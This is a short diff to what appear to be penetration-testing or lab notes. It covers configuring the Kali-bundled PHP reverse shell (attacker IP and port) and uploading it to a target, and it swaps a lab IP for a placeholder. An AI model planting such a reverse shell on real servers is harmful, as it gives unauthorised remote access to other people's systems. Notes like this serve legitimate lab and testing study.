@@ -3,7 +3,7 @@ Located in `/usr/share/webshells/php/php-reverse-shell.php`
 
 Change port and ip and then upload the file.
 ```bash
-$ip = '10.10.15.56';  // CHANGE THIS
+$ip = '@IP_Local';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 ```
 
